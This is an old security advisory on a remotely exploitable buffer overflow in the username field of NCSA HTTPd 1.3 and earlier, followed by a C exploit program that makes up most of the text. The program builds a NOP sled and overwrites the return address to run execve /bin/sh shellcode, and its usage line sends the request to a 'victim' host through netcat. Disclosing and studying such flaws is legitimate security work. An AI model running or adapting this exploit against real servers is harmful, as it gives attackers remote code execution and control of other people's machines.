source: http://www.securityfocus.com/bid/3158/info
 
NCSA HTTPd is a free, open-source web server for *nix systems.
 
NCSA HTTPd versions 1.3 and earlier are prone to an exploitable buffer overflow(in the username field) which will allow malicious remote users to execute arbitrary code with the privileges of the webserver process.
 
Successful exploitation of this vulnerability will allow a remote attacker to gain local access to the host. 

/*     
; NCSA Webserver Buffer Overflow in 1.3 
; 	By Xtremist (xtremist@2xs.co.il) for [r00tabega.security.labs]
; Tested on Slackware 4.0 with NCSA 1.3  
;     usage:
; 	$ (ncsaexpl 0; cat) | nc victim 80
;                   
;                    OFFSET usually from -1000 to 1000 
;   greets all people i know :)
;*/

#include <stdio.h>

unsigned char shell[] = /*  alphae1's shellcode for execve */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


char user[264];

long get_esp(void) {
	__asm__("movl %esp,%eax");
}

int main(int argc,char **argv){ 

int i; int offset=160;
long ret;
if(argc>1) {
  offset=atoi(argv[1]);
}
ret=(get_esp()-offset);

for(i=1;i<264;i+=4){
*(long *)&user[i]=ret;
}

for(i=0;i<(260-strlen(shell));i++) {
*(user+i)=0x90; /*NOP*/
}

memcpy(shell+i,shell,strlen(shell));

printf("GET %s\n", user);

}

